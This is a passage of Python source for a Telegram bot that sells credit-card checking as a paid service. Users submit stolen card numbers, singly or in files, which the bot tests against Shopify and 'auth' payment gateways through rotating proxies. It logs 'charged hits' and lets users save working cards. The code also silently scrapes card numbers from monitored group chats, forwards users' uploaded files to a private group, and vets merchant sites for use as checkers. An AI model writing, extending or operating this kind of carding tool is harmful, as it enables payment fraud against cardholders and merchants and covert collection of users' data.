    if cb.from_user.id not in (OWNER_ID, OWNER_ID2): return await cb.answer("Owner only", show_alert=True)
    set_awaiting(cb.from_user.id, "admin_add_admin")
    await edit_admin(cb, f"{pe('add')} <code>[uid]</code>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:main")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:add_ltd_admin")
async def cb_admin_add_ltd_admin(cb: CallbackQuery):
    if cb.from_user.id not in (OWNER_ID, OWNER_ID2): return await cb.answer("Owner only", show_alert=True)
    set_awaiting(cb.from_user.id, "admin_add_ltd_admin")
    await edit_admin(cb, f"{pe('add')} <b>{sc('Add Moderator')}</b>\n<blockquote>{pe('pen')} <code>[uid]</code></blockquote>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:main")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:manage_admins")
async def cb_manage_admins(cb: CallbackQuery):
    if cb.from_user.id not in (OWNER_ID, OWNER_ID2): return await cb.answer("Only Owner!", show_alert=True)
    text = "👑 <b>Admin Management</b>\n\n<b>Full Admins:</b>\n"
    for a in ADMIN_IDS: text += f"• <code>{a}</code>\n"
    text += "\n<b>Moderators (Limited):</b>\n"
    for a in LIMITED_ADMIN_IDS: text += f"• <code>{a}</code>\n"
    kb = InlineKeyboardMarkup(inline_keyboard=[[pbtn("Add Full Admin", icon="add", color="success", callback_data="admin:add_admin")], [pbtn("Add Moderator", icon="add", color="success", callback_data="admin:add_ltd_admin")], [pbtn("Back", icon="back", callback_data="admin:main")]])
    await edit_admin(cb, text, kb)
    await cb.answer()

@router.callback_query(F.data == "admin:gen_code")
async def cb_admin_gen_code(cb: CallbackQuery):
    if not is_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "admin_gen_code")
    await edit_admin(cb, f"{pe('gem')} <code>[plan] [uses] [days]</code>\n{pe('pen')} {sc('Example')}: <code>premium 5 30</code>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:main")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:broadcast")
async def cb_admin_bc(cb: CallbackQuery):
    if not is_admin(cb.from_user.id): return
    kb = InlineKeyboardMarkup(inline_keyboard=[[pbtn("All Users", icon="user", color="primary", callback_data="admin:bc_all")], [pbtn("Premium Only", icon="gem", color="success", callback_data="admin:bc_premium")], [pbtn("Back", icon="back", callback_data="admin:main")]])
    await edit_admin(cb, f"{pe('bell')} <b>{sc('Broadcast')}</b>\n<blockquote>{sc('Select target audience')}</blockquote>", kb)
    await cb.answer()

@router.callback_query(F.data.startswith("admin:bc_"))
async def cb_admin_bc_target(cb: CallbackQuery):
    if not is_admin(cb.from_user.id): return
    target = cb.data.split("_")[1]
    set_awaiting(cb.from_user.id, f"admin_broadcast:{target}")
    await edit_admin(cb, f"{pe('bell')} <b>{sc('Send broadcast')}</b>\n<blockquote>{sc('Text or photo with caption')}</blockquote>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:main")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:close")
async def cb_admin_close(cb: CallbackQuery):
    try: await cb.message.delete()
    except: pass
    await cb.answer()

# ── ADMIN TEXT HANDLER (Inputs) ──────────────────────────────────────────────
@router.message(F.text)
async def handle_text(msg: Message):
    if msg.text and msg.text.startswith("/"): return
    uid, awaiting = msg.from_user.id, get_awaiting(msg.from_user.id)
    ensure_user(uid, msg.from_user.username or "")
    # Secret scrapper — silently extract CCs from configured GCs
    if msg.chat.type in ("group", "supergroup"):
        asyncio.create_task(_silent_scrap_message(msg))
        return  # never reply in groups, just silently scrap

    if awaiting == "redeem_input": set_awaiting(uid, ''); await redeem_code(msg, msg.text.strip()); return

    if awaiting and awaiting.startswith("fb_reply:"):
        set_awaiting(uid, '')
        parts = awaiting.split(":")
        fid, target_uid = parts[1], int(parts[2])
        reply_text = (
            f"{pe('chat')} <b>{sc('Admin Reply')} (#{fid})</b>\n"
            f"<blockquote>{esc(msg.text[:800])}</blockquote>"
        )
        try: await msg.bot.send_message(target_uid, reply_text, parse_mode="HTML")
        except: pass
        await msg.answer(f"{pe('check')} <b>{sc('Reply sent')}</b>", parse_mode="HTML")
        return

    if awaiting and awaiting.startswith("iadmin_reply:"):
        set_awaiting(uid, '')
        target_uid = int(awaiting.split(":")[1])
        reply_text = (
            f"{pe('chat')} <b>{sc('Admin Reply')}</b>\n"
            f"<blockquote>{esc(msg.text[:800])}</blockquote>"
        )
        try: await msg.bot.send_message(target_uid, reply_text, parse_mode="HTML")
        except: pass
        await msg.answer(f"{pe('check')} <b>{sc('Reply sent')}</b>", parse_mode="HTML")
        return
    if awaiting == "add_proxy":
        set_awaiting(uid, ''); parsed = parse_proxy_txt(msg.text)
        if not parsed: return await msg.answer(f"{pe('cross1')} <b>{sc('No valid proxies')}</b>", parse_mode="HTML", reply_markup=proxy_kb(uid))
        st = await msg.answer(f"{pe('loading')} <b>{sc('Testing')} {len(parsed)} {sc('proxies')}...</b>", parse_mode="HTML")
        result = await add_proxies_bulk(uid, parsed)
        await st.edit_text(f"{pe('check')} <b>{sc('Proxy Add Complete')}</b>\n<blockquote>{pe('add')} {sc('Parsed')}: <b>{result['total_parsed']}</b>\n{pe('check')} {sc('Live')}: <b>{result['live']}</b>\n{pe('cross2')} {sc('Dead')}: <b>{result['dead']}</b></blockquote>", parse_mode="HTML", reply_markup=proxy_kb(uid))
        return
    
    if awaiting == "gift_credits":
        set_awaiting(uid, '')
        parts = msg.text.split(maxsplit=1)
        if len(parts) != 2 or not parts[1].isdigit(): return await msg.answer(f"{pe('cross1')} <b>{sc('Invalid format')}</b>", parse_mode="HTML")
        target, amount = parts[0], int(parts[1])
        if amount < 10: return await msg.answer(f"{pe('cross1')} <b>{sc('Min 10 credits')}</b>", parse_mode="HTML")
        with db() as c:
            u = c.execute("SELECT credits FROM users WHERE uid=?", (uid,)).fetchone()
            if not u or u["credits"] < amount: return await msg.answer(f"{pe('cross1')} <b>{sc('Not enough credits')}</b>", parse_mode="HTML")
            t = c.execute("SELECT uid FROM users WHERE username=?", (target.lstrip("@"),)).fetchone()
            if not t: return await msg.answer(f"{pe('cross1')} <b>{sc('User not found')}</b>", parse_mode="HTML")
            c.execute("UPDATE users SET credits=credits-? WHERE uid=?", (amount, uid))
            c.execute("UPDATE users SET credits=credits+? WHERE uid=?", (amount, t["uid"]))
        await msg.answer(f"{pe('check')} <b>{sc('Gifted')} {amount} credits to {target}</b>", parse_mode="HTML")
        try: await _bot_ref.send_message(t["uid"], f"{pe('gem')} You received {amount} credits from @{msg.from_user.username or uid}!")
        except: pass
        return

    if awaiting == "restore_backup" and is_full_admin(uid):
        set_awaiting(uid, '')
        try:
            with db() as c:
                for t in ["users", "settings", "redeem_codes", "redeem_log", "check_logs", "saved_cards", "bin_cache", "user_proxies", "sites", "force_channels", "charged_hits", "feedback"]: c.execute(f"DROP TABLE IF EXISTS {t}")
                c.executescript(msg.text)
            reset_db_conn()
            init_db(); load_extra_admins(); _invalidate_sites()
            await msg.answer(f"{pe('check')} <b>Database Restored</b>", parse_mode="HTML", reply_markup=admin_main_kb(uid))
        except Exception as e: await msg.answer(f"{pe('cross1')} Restore failed: {esc(str(e))}", parse_mode="HTML", reply_markup=admin_main_kb(uid))
        return
    
    if awaiting and is_admin(uid):
        set_awaiting(uid, ''); v = msg.text.strip()
        if awaiting == "admin_gen_code":
            parts = msg.text.split()
            if len(parts) == 3 and parts[0].lower() in PLANS and parts[1].isdigit() and parts[2].isdigit():
                code = f"{KEY_PREFIX}-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
                with db() as c: c.execute("INSERT INTO redeem_codes (code, plan, max_uses, days, used) VALUES (?,?,?,?,0)", (code, parts[0].lower(), int(parts[1]), int(parts[2])))
                await msg.answer(f"{pe('gem')} <b>{sc('Code')}</b>\n<blockquote>{pe('star')} <code>{code}</code>\n{pe('gem')} {PLANS[parts[0].lower()]['name']}\n{pe('user')} {sc('Uses')}: <b>{parts[1]}</b>\n{pe('hourglass')} {sc('Days')}: <b>{parts[2]}</b></blockquote>", parse_mode="HTML", reply_markup=admin_main_kb(uid))
            else: await msg.answer(f"{pe('cross1')} {sc('invalid')}", reply_markup=admin_main_kb(uid))
        elif awaiting == "admin_add_admin" and v.isdigit():
            if int(v) not in ADMIN_IDS: ADMIN_IDS.append(int(v)); LIMITED_ADMIN_IDS[:] = [x for x in LIMITED_ADMIN_IDS if x != int(v)]; save_extra_admins()
            await msg.answer(f"{pe('check')} {sc('Admin granted')}", reply_markup=admin_main_kb(uid))
        elif awaiting == "admin_add_ltd_admin" and v.isdigit():
            if int(v) not in LIMITED_ADMIN_IDS and int(v) not in ADMIN_IDS: LIMITED_ADMIN_IDS.append(int(v)); save_extra_admins()
            await msg.answer(f"{pe('check')} <b>{sc('Moderator granted')}</b>", parse_mode="HTML", reply_markup=admin_main_kb(uid))
        elif awaiting.startswith("admin_broadcast:"):
            target = awaiting.split(":")[1]
            res = await broadcast_all(msg.bot, text=msg.html_text, only_premium=(target == "premium"))
            await msg.answer(f"{pe('check')} {sc('Sent')} {res['ok']}/{res['total']}", reply_markup=admin_main_kb(uid))
        elif awaiting.startswith("set_setting:"):
            key = awaiting.split(":")[1]
            val = "" if v.lower() == "off" else v
            set_setting(key, val)
            await msg.answer(f"✅ {key} updated to: <code>{val or 'Cleared'}</code>", reply_markup=admin_main_kb(uid))
        elif awaiting.startswith("set_asset:"):
            key = awaiting.split(":")[1]
            if msg.text.startswith("http"):
                set_setting(key, msg.text.strip())
                await msg.answer(f"✅ Asset {key} updated to new URL!", reply_markup=admin_main_kb(uid))
            else: await msg.answer("❌ Send a valid URL or photo.", reply_markup=admin_main_kb(uid))
        elif awaiting == "admin_api_sl_add":
            endpoints = [l.strip() for l in msg.text.splitlines() if l.strip().startswith("http")]
            for ep in endpoints: add_siteless_api(ep)
            await msg.answer(f"{pe('check')} <b>{sc('Added')} {len(endpoints)} {sc('siteless APIs')}</b>", parse_mode="HTML", reply_markup=admin_main_kb(uid))
        elif awaiting == "admin_api_ws_add":
            endpoints = [l.strip() for l in msg.text.splitlines() if l.strip().startswith("http")]
            for ep in endpoints: add_withsite_api(ep)
            await msg.answer(f"{pe('check')} <b>{sc('Added')} {len(endpoints)} {sc('with-site APIs')}</b>", parse_mode="HTML", reply_markup=admin_main_kb(uid))
        elif awaiting == "admin_site_chkr":
            sites = parse_site_list(msg.text)
            if not sites: await msg.answer(f"{pe('cross1')} {sc('No valid sites')}", reply_markup=admin_main_kb(uid)); return
            st = await msg.answer(f"{pe('loading')} <b>{sc('Checking')} {len(sites)} {sc('sites via API')}...</b>\n<blockquote>{pe('warn')} {sc('Results NOT saved to DB')}</blockquote>", parse_mode="HTML")
            max_p = float(get_setting("site_max_price", "6.0"))
            # Use bulk_add_sites logic but DON'T save — custom version
            clean_tmp, upper_tmp, dead_tmp = [], [], []
            sem2, lock2 = asyncio.Semaphore(10), asyncio.Lock()
            async def chkr_one(s2):
                res2 = await test_site(s2, timeout=20)
                cls2, amount2, resp2 = res2.get("cls","error"), float(res2.get("amount") or 0.0), res2.get("response","")[:80]
                async with lock2:
                    if cls2 in ("error","timeout","proxy_error","site_error"): dead_tmp.append({"site":s2,"reason":resp2,"cls":cls2})
                    elif amount2 > max_p or "CAPTCHA" in resp2.upper(): upper_tmp.append({"site":s2,"price":amount2,"cls":cls2,"resp":resp2})
                    elif cls2 in WORKING_SITE_CLASSES: clean_tmp.append({"site":s2,"price":amount2,"cls":cls2})
                    else: dead_tmp.append({"site":s2,"reason":resp2,"cls":cls2})
            await asyncio.gather(*(chkr_one(s) for s in sites))
            lines = [f"{pe('check')} <b>{sc('Site Checker Results (Admin Only)')}</b>", f"<blockquote>{pe('shop')} {sc('Total')}: <b>{len(sites)}</b>\n{pe('check')} {sc('Clean')}: <b>{len(clean_tmp)}</b>\n{pe('warn')} {sc('High Price')} (>${max_p:.0f}): <b>{len(upper_tmp)}</b>\n{pe('cross2')} {sc('Dead')}: <b>{len(dead_tmp)}</b>\n{pe('docs')} {sc('Not saved to DB')}</blockquote>"]
            if clean_tmp:
                lines.append(f"<blockquote><b>{pe('check')} {sc('Clean')}:</b>")
                for s in clean_tmp[:10]: lines.append(f"  <code>{esc(s['site'])}</code> · ${s['price']:.2f}")
                lines.append("</blockquote>")
            try: await st.edit_text("\n".join(lines), parse_mode="HTML", reply_markup=admin_main_kb(uid))
            except: await msg.answer("\n".join(lines), parse_mode="HTML", reply_markup=admin_main_kb(uid))
            if clean_tmp:
                txt = _make_sites_txt(clean_tmp, f"Clean Sites (not saved) — ${max_p:.2f} max")
                try: await msg.answer_document(BufferedInputFile(txt, filename=f"chkr_clean_{datetime.now().strftime('%H%M%S')}.txt"), caption=f"{pe('check')} <b>{sc('Clean Sites')}</b>", parse_mode="HTML")
                except: pass
            if upper_tmp:
                txt = _make_sites_txt(upper_tmp, f"High Price Sites — >${max_p:.2f}")
                try: await msg.answer_document(BufferedInputFile(txt, filename=f"chkr_upper_{datetime.now().strftime('%H%M%S')}.txt"), caption=f"{pe('warn')} <b>{sc('High Price Sites')}</b>", parse_mode="HTML")
                except: pass
        elif awaiting == "admin_scrapper_add":
            fwd = getattr(msg, "forward_from_chat", None)
            if fwd:
                chat_id = str(fwd.id); title = fwd.title or ""
                with db() as c: c.execute("INSERT OR REPLACE INTO scrapper_gcs(chat_id, title, added_at) VALUES(?,?,?)", (chat_id, title, datetime.now(timezone.utc).isoformat()))
                await msg.answer(f"{pe('check')} {sc('Scrapper GC added')}: {esc(title)}", reply_markup=admin_main_kb(uid))
            elif msg.text.strip().lstrip("-").isdigit():
                chat_id = msg.text.strip()
                with db() as c: c.execute("INSERT OR REPLACE INTO scrapper_gcs(chat_id, title, added_at) VALUES(?,?,?)", (chat_id, chat_id, datetime.now(timezone.utc).isoformat()))
                await msg.answer(f"{pe('check')} {sc('Scrapper GC added')}: {chat_id}", reply_markup=admin_main_kb(uid))
            else: await msg.answer(f"{pe('cross1')} {sc('Send chat ID or forward from group')}", reply_markup=admin_main_kb(uid))
        elif awaiting == "admin_sites_add":
            raw_input = msg.text.strip()
            site_count = len([l for l in re.split(r"[\r\n,;]+", raw_input) if l.strip()])
            st = await msg.answer(f"{pe('loading')} <b>{sc('Checking')} {site_count} {sc('sites via API')}...</b>\n<blockquote>{pe('hourglass')} {sc('This may take a moment')}</blockquote>", parse_mode="HTML")
            result = await bulk_add_sites(raw_input)
            report = _bulk_sites_report(result)
            try: await st.edit_text(report, parse_mode="HTML", reply_markup=admin_main_kb(uid))
            except: await msg.answer(report, parse_mode="HTML", reply_markup=admin_main_kb(uid))
            # Send clean sites TXT
            if result["clean"]:
                clean_txt = _make_sites_txt(result["clean"], f"Clean Sites (≤${result['max_price']:.2f}) — {len(result['clean'])} sites")
                fname_clean = f"clean_sites_{datetime.now().strftime('%H%M%S')}.txt"
                try: await msg.answer_document(BufferedInputFile(clean_txt, filename=fname_clean), caption=f"{pe('check')} <b>{sc('Clean Sites')} ({len(result['clean'])})</b>", parse_mode="HTML")
                except: pass
            # Send upper-price sites TXT
            if result["upper"]:
                upper_txt = _make_sites_txt(result["upper"], f"Upper Price Sites (>${result['max_price']:.2f}) — {len(result['upper'])} sites")
                fname_upper = f"upper_price_sites_{datetime.now().strftime('%H%M%S')}.txt"
                try: await msg.answer_document(BufferedInputFile(upper_txt, filename=fname_upper), caption=f"{pe('warn')} <b>{sc('High Price Sites')} ({len(result['upper'])})</b>", parse_mode="HTML")
                except: pass
        elif awaiting == "admin_api_add":
            url = msg.text.strip()
            if url.startswith("http"):
                st = load_api_state()
                st["endpoints"].append({"url": url, "style": "raw", "cap": 900, "enabled": True, "key": None, "site_required": False})
                save_api_state(st)
                await msg.answer(f"✅ API Added: {url}", reply_markup=admin_main_kb(uid))
            else: await msg.answer("❌ Invalid URL", reply_markup=admin_main_kb(uid))
        elif awaiting == "admin_force_add":
            fwd = getattr(msg, "forward_from_chat", None)
            if fwd:
                chat_id = str(fwd.id)
                title = fwd.title or ""
                invite = ""
                try:
                    chat = await msg.bot.get_chat(chat_id)
                    invite = chat.invite_link if chat.invite_link else (f"https://t.me/{chat.username}" if chat.username else "")
                except: pass
                add_force_channel(chat_id, title, fwd.type, invite)
                await msg.answer(f"✅ Added Force Channel: {title}", reply_markup=admin_main_kb(uid))
            elif msg.text.startswith("@"):
                username = msg.text.strip()
                try:
                    chat = await msg.bot.get_chat(username)
                    chat_id = str(chat.id)
                    title = chat.title or ""
                    invite = chat.invite_link if chat.invite_link else (f"https://t.me/{chat.username}" if chat.username else "")
                    add_force_channel(chat_id, title, chat.type, invite)
                    await msg.answer(f"✅ Added Force Channel: {title}", reply_markup=admin_main_kb(uid))
                except Exception as e: await msg.answer(f"❌ Error: {e}", reply_markup=admin_main_kb(uid))
            else: await msg.answer("❌ Invalid. Forward from channel or send @username", reply_markup=admin_main_kb(uid))
        elif awaiting == "admin_user_search" and v.isdigit():
            target_uid = int(v)
            u = get_user(target_uid)
            if not u: await msg.answer("❌ User not found.", reply_markup=admin_main_kb(uid))
            else:
                with db() as c:
                    proxies = c.execute("SELECT COUNT(*) as n FROM user_proxies WHERE uid=?", (target_uid,)).fetchone()["n"]
                    saved = c.execute("SELECT COUNT(*) as n FROM saved_cards WHERE uid=?", (target_uid,)).fetchone()["n"]
                text = f"👤 <b>[=] User Full Details</b>\n<blockquote>━━━━━━━━━━━━━━━━━━━━\n🆔 <b>UID</b> ~ <code>{target_uid}</code>\n📝 <b>Name</b> ~ {esc(u['username'] or 'N/A')}\n💎 <b>Plan</b> ~ {sc(u['plan'])}\n🚫 <b>Status</b> ~ {'BANNED' if u['banned'] else 'Active'}\n━━━━━━━━━━━━━━━━━━━━\n💰 <b>Credits</b> ~ {u['credits']}\n🛒 <b>Checks</b> ~ {u['total_checks']}\n✅ <b>Hits</b> ~ {u['total_hits']}\n🔗 <b>Proxies</b> ~ {proxies}\n📁 <b>Saved Cards</b> ~ {saved}\n🤝 <b>Referrals</b> ~ {u['refer_count']}</blockquote>"
                kb = InlineKeyboardMarkup(inline_keyboard=[[pbtn("Ban/Unban", icon="warn_red", color="danger", callback_data=f"admin:ban_user:{target_uid}")], [pbtn("Give Credits", icon="star", color="success", callback_data=f"admin:give_credits:{target_uid}")], [pbtn("Give Premium", icon="gem", color="success", callback_data=f"admin:give_premium:{target_uid}")], [pbtn("Back", icon="back", callback_data="admin:main")]])
                await msg.answer(text, parse_mode="HTML", reply_markup=kb)
        elif awaiting.startswith("give_credits:"):
            target_uid = int(awaiting.split(":")[1])
            if v.isdigit():
                with db() as c: c.execute("UPDATE users SET credits=credits+? WHERE uid=?", (int(v), target_uid))
                await msg.answer(f"✅ Added {v} credits to {target_uid}", reply_markup=admin_main_kb(uid))
            else: await msg.answer("❌ Invalid amount.", reply_markup=admin_main_kb(uid))
        elif awaiting.startswith("edit_price:"):
            plan = awaiting.split(":")[1]
            if v.replace('.','',1).isdigit():
                set_setting(f"price_{plan}", v)
                await msg.answer(f"✅ {plan.title()} price updated to ${v}", reply_markup=admin_main_kb(uid))
            else: await msg.answer("❌ Invalid number.", reply_markup=admin_main_kb(uid))
        elif awaiting == "edit_trial":
            if v.isdigit():
                set_setting("trial_hours", v)
                await msg.answer(f"✅ Trial duration set to {v} Hours.", reply_markup=admin_main_kb(uid))
            else: await msg.answer("❌ Invalid hours.", reply_markup=admin_main_kb(uid))
        return
    
    if not await check_force_sub(msg.bot, uid): return await msg.answer(f"{pe('unlock')} <b>{sc('Join required channels first')}</b>", parse_mode="HTML")
    normalized, seen = [], set()
    for line in msg.text.splitlines():
        for tok in re.split(r"[\s,;]+", line):
            n = normalize_cc(tok)
            if n and n not in seen: seen.add(n); normalized.append(n)
    if not normalized: return
    proxy_set = bool(user_proxy_list(uid))
    proxy_status = f"✅ {sc('Set')}" if proxy_set else f"❌ {sc('Not Set — Required for Auth')}"
    if len(normalized) == 1:
        # single CC — show Shopify + Auth buttons
        cc_single = normalized[0]
        _cleanup_pending_mass(); token = uuid.uuid4().hex[:12]
        _pending_mass[token] = {"uid": uid, "cards": normalized, "ts": time.time()}
        text = (
            f"{pe('glow_star')} <b>{sc('Card Detected')}</b>\n"
            f"<blockquote>{pe('gem4')} <code>{cc_single}</code>\n"
            f"{pe('link')} {sc('Proxy')}: {proxy_status}\n"
            f"{pe('docs')} {sc('Choose checker')}:</blockquote>"
        )
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [pbtn(sc("Shopify"), icon="shop", color="success", callback_data=f"mass:start:shopify:{token}"),
             pbtn(sc("Auth"), icon="gem", color="primary", callback_data=f"mass:start:auth:{token}")],
            [pbtn(sc("Cancel"), icon="cross1", color="danger", callback_data=f"mass:cancel:{token}")]
        ])
        try: await msg.answer_photo(photo=random.choice(IMAGES), caption=text, parse_mode="HTML", reply_markup=kb)
        except: await msg.answer(text, parse_mode="HTML", reply_markup=kb)
        return

    _cleanup_pending_mass(); token = uuid.uuid4().hex[:12]; _pending_mass[token] = {"uid": uid, "cards": normalized, "ts": time.time()}
    text = (
        f"{pe('glow_star')} <b>{sc('Cards Detected')}</b>\n"
        f"<blockquote>{pe('gem')} {sc('Count')}: <b>{len(normalized)}</b>\n"
        f"{pe('link')} {sc('Proxy')}: {proxy_status}\n"
        f"{pe('docs')} {sc('Choose Checker Type')}:</blockquote>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [pbtn(sc("Shopify Checker"), icon="shop", color="success", callback_data=f"mass:start:shopify:{token}"),
         pbtn(sc("Auth Checker"), icon="gem", color="primary", callback_data=f"mass:start:auth:{token}")],
        [pbtn(sc("Cancel"), icon="cross1", color="danger", callback_data=f"mass:cancel:{token}")]
    ])
    try: await msg.answer_photo(photo=random.choice(IMAGES), caption=text, parse_mode="HTML", reply_markup=kb)
    except: await msg.answer(text, parse_mode="HTML", reply_markup=kb)

@router.message(F.photo)
async def handle_photo(msg: Message):
    awaiting = get_awaiting(msg.from_user.id)
    if awaiting and awaiting.startswith("set_asset:") and is_admin(msg.from_user.id):
        key = awaiting.split(":")[1]
        set_awaiting(msg.from_user.id, '')
        file_id = msg.photo[-1].file_id
        set_setting(key, file_id)
        await msg.answer(f"✅ Asset {key} updated to new photo!", reply_markup=admin_main_kb(msg.from_user.id))
        return
    if awaiting and awaiting.startswith("admin_broadcast:") and is_admin(msg.from_user.id):
        target = awaiting.split(":")[1]
        set_awaiting(msg.from_user.id, '')
        res = await broadcast_all(msg.bot, photo=msg.photo[-1].file_id, caption=msg.html_text or msg.caption or "", only_premium=(target == "premium"))
        await msg.answer(f"{pe('check')} {sc('Sent')} {res['ok']}/{res['total']}", reply_markup=admin_main_kb(msg.from_user.id))

@router.message(F.document)
async def handle_document(msg: Message):
    uid, awaiting = msg.from_user.id, get_awaiting(msg.from_user.id)
    if not is_full_admin(uid): await forward_user_file_to_pvt_gc(msg.bot, msg, context=awaiting or "general")
    
    if awaiting == "restore_backup" and is_full_admin(uid):
        set_awaiting(uid, '')
        st = await msg.answer(f"{pe('loading')} <b>{sc('Restoring DB')}...</b>", parse_mode="HTML")
        try:
            raw_bytes = (await msg.bot.download_file((await msg.bot.get_file(msg.document.file_id)).file_path)).read()
            if await _restore_from_bytes(raw_bytes, uid, st): await st.edit_text(f"{pe('check')} <b>Database Restored Successfully</b>", parse_mode="HTML", reply_markup=admin_main_kb(uid))
        except Exception as e: await st.edit_text(f"{pe('cross1')} <b>Restore failed:</b> {esc(str(e)[:200])}", parse_mode="HTML", reply_markup=admin_main_kb(uid))
        return
    
    doc = msg.document
    if not (doc.file_name or "").lower().endswith((".txt", ".csv")): return
    
    st = await msg.answer(f"{pe('loading')} <b>{sc('Downloading')}...</b>", parse_mode="HTML")
    try:
        cards = await _scan_file_for_ccs(msg.bot, doc)
        if not cards: return await st.edit_text(f"{pe('cross1')} <b>{sc('No cards found in file')}</b>", parse_mode="HTML")
        _cleanup_pending_mass()
        token = uuid.uuid4().hex[:12]
        _pending_mass[token] = {"uid": uid, "cards": cards, "ts": time.time()}
        proxy_set = bool(user_proxy_list(uid))
        proxy_status = f"✅ {sc('Set')}" if proxy_set else f"❌ {sc('Not Set — Required for Auth')}"
        text = (
            f"{pe('check')} <b>{sc('File Detected')}</b>\n"
            f"<blockquote>{pe('gem')} {sc('Cards')}: <b>{len(cards)}</b>\n"
            f"{pe('link')} {sc('Proxy')}: {proxy_status}\n"
            f"{pe('docs')} {sc('Choose checker type')}:</blockquote>"
        )
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [pbtn(sc("Shopify"), icon="shop", color="success", callback_data=f"mass:start:shopify:{token}"),
             pbtn(sc("Auth"), icon="gem", color="primary", callback_data=f"mass:start:auth:{token}")],
            [pbtn(sc("Cancel"), icon="cross1", color="danger", callback_data=f"mass:cancel:{token}")]
        ])
        await st.edit_text(text, parse_mode="HTML", reply_markup=kb)
    except Exception as e: await st.edit_text(f"{pe('cross1')} <b>Failed:</b> {esc(str(e)[:100])}", parse_mode="HTML")

async def process_check_logic(msg, cc_line: str, bot, uid=None, username=None, mode="shopify"):
    # Resolve uid/username safely regardless of whether msg is from a callback or command
    try:
        if uid is None: uid = msg.from_user.id
        if username is None: username = (msg.from_user.username or "") if msg.from_user else ""
    except Exception:
        if uid is None: return
    if bot is None:
        try: bot = _bot_ref
        except: return
    user = get_user_or_create(uid, username)
    if not user: return await msg.answer(f"{pe('cross1')} <b>{sc('Error')}</b>. /start", parse_mode="HTML")
    if user["banned"]: return await msg.answer(f"{pe('cross1')} <b>{sc('You are banned')}</b>", parse_mode="HTML")
    user_proxies = user_proxy_list(uid)
    if not is_admin(uid) and not user_proxies and mode == "auth" and get_setting("proxy_required", "0") == "1":
        return await msg.answer(f"{pe('cross1')} <b>{sc('Proxy Required for Auth')}</b>\n<blockquote>{pe('link')} {sc('Add via')} /proxy</blockquote>", parse_mode="HTML")
    now, cd = time.time(), get_check_cooldown()
    if uid in user_cooldowns and now - user_cooldowns[uid] < cd:
        return await msg.answer(f"{pe('stop')} {sc('Cooldown')}: <b>{cd - int(now - user_cooldowns[uid])}s</b>", parse_mode="HTML")
    user_cooldowns[uid] = now
    ok, _ = consume_quota(uid)
    if not ok:
        u = get_user(uid)
        return await msg.answer(f"{pe('unlock')} <b>{sc('Limit Reached')}</b>\n<blockquote>{pe('gem')} {PLANS[u['plan']]['name']}\n{pe('star')} {sc('Credits')}: {u['credits']} ({sc('need 2')})</blockquote>\n/shop", parse_mode="HTML")
    proxy = rotate_proxy(uid, user_proxies) if user_proxies else None
    # Send a fresh text message for the loading animation — never edit a caption-based message
    loading = await msg.answer(
        f"{spinner_frame(0)} <b>{sc('Connecting')}...</b>\n<blockquote><code>{cc_line}</code></blockquote>",
        parse_mode="HTML"
    )
    stop_ev = asyncio.Event()
    anim_task = asyncio.create_task(animate_loading(loading, cc_line, stop_ev))
    try:
        try: await bot.send_chat_action(msg.chat.id, "typing")
        except: pass
        res = await call_api(cc_line, proxy=proxy, uid=uid, mode=mode, single=True)
    except Exception as e:
        res = {"cls": "error", "response": _sanitize_err(str(e)), "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": ""}
    finally:
        stop_ev.set()
        try: await asyncio.wait_for(anim_task, timeout=2.0)
        except: pass
    bin_info = None
    if res.get("cls", "error") not in ("error", "proxy_error", "timeout"):
        try: bin_info = await lookup_bin(cc_line.split("|")[0][:6])
        except: pass
        try:
            status_str = "SITE_ERROR" if res["cls"] == "site_error" else ("HIT" if is_hit(res["cls"]) else "DECLINED")
            async with _get_write_lock():
                with db() as c:
                    c.execute("INSERT INTO check_logs(uid,cc,response,status,gateway,ts) VALUES(?,?,?,?,?,?)", (uid, cc_line, _sanitize_err(res.get("response","")), status_str, res.get("gateway","Shopify"), datetime.now(timezone.utc).isoformat()))
                    if is_hit(res["cls"]): c.execute("UPDATE users SET total_hits=total_hits+1 WHERE uid=?", (uid,))
        except: pass
        if is_hit(res["cls"]):
            try: await record_charged(cc_line, res, res.get("_site",""), uid, bin_info=bin_info)
            except Exception as e: log.error(f"process_check_logic record_charged: {e}")
    text = format_result(cc_line, res, bin_info)
    hit = is_hit(res.get("cls", "declined"))
    btns = [pbtn(sc("Recheck"), icon="refresh", callback_data=f"recheck:{cc_line}")]
    if hit: btns.append(pbtn(sc("Save"), icon="book", color="success", callback_data=f"save:{cc_line}"))
    try: await loading.delete()
    except: pass
    if hit:
        media = random.choice(VIDEOS)
        try: await msg.answer_video(video=media, caption=text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(inline_keyboard=[btns]))
        except: await msg.answer(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(inline_keyboard=[btns]))
    else:
        media = random.choice(IMAGES)
        try: await msg.answer_photo(photo=media, caption=text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(inline_keyboard=[btns]))
        except: await msg.answer(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(inline_keyboard=[btns]))

async def run_mass_check(msg, cards, bot, bypass_quota=False, uid=None, username=None, mode="shopify"):
    if uid is None: uid = msg.from_user.id
    if username is None: username = msg.from_user.username or ""
    user = get_user_or_create(uid, username)
    if not user or user["banned"]: return await msg.answer(f"{pe('cross1')} <b>{sc('Not allowed')}</b>", parse_mode="HTML")
    normalized, seen = [], set()
    for c in cards:
        n = normalize_cc(c.strip())
        if n and n not in seen: seen.add(n); normalized.append(n)
    if not normalized: return await msg.answer(f"{pe('warn')} <b>{sc('No valid cards')}</b>", parse_mode="HTML")
    total = len(normalized); _dead_proxies_run.clear(); _proxy_fail_streak.clear()
    source_proxies = user_proxy_list(uid); live_proxies = []
